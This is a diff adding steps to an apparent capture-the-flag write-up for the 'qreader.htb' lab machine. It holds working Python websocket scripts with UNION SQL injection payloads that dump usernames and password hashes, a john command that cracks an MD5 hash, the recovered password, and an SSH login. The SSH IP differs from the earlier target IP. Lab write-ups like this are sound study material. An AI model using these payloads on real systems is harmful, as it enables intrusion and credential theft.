@@ -123,3 +123,48 @@ Testing ws://10.10.11.206:5789
 ```
 ![image](https://user-images.githubusercontent.com/83878909/230316867-b080dca6-cdfd-4ebd-a4e3-2c437f9ecc46.png)
 
+- Code vulnerable to SQL injection in the `qreader.py` source code file.
+![image](https://user-images.githubusercontent.com/83878909/230321898-e204482f-f555-4174-95a0-99bcbfe452eb.png)
+
+- Retrieving the Usernames
+```CSS
+from websocket import create_connection
+import json
+
+ws_host = 'ws://qreader.htb:5789'
+VERSION = '0.0.3" UNION SELECT group_concat(answer),"2","3","4" FROM answers;-- -'
+ws = create_connection(ws_host + '/version')
+ws.send(json.dumps({'version': VERSION}))
+result = ws.recv()
+print(result)
+ws.close()
+```
+![image](https://user-images.githubusercontent.com/83878909/230322498-1e5a64d2-90b7-4d77-8f52-71c8ca513408.png)
+
+- Retrieving the Passwords
+```CSS
+from websocket import create_connection
+import json
+
+ws_host = 'ws://qreader.htb:5789'
+VERSION = '0.0.3" UNION SELECT username,password,"3","4" from users;-- -'
+ws = create_connection(ws_host + '/version')
+ws.send(json.dumps({'version': VERSION}))
+result = ws.recv()
+print(result)
+ws.close()
+```
+![image](https://user-images.githubusercontent.com/83878909/230322831-b495e3ef-7247-48a0-ad42-69ee2ef2a624.png)
+
+### Crack the Password
+```CSS
+▶ john pass --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
+```
+![image](https://user-images.githubusercontent.com/83878909/230323862-17342bf6-c263-47dc-b674-c560d7d47baf.png)
+- Clear Text Password: `denjanjade122566`
+
+## SSH Login
+```CSS
+▶ ssh tkeller@10.10.10.206
+```
+![image](https://user-images.githubusercontent.com/83878909/230324605-3f62c848-a217-4a0a-98d0-3a7bcd6198dc.png)
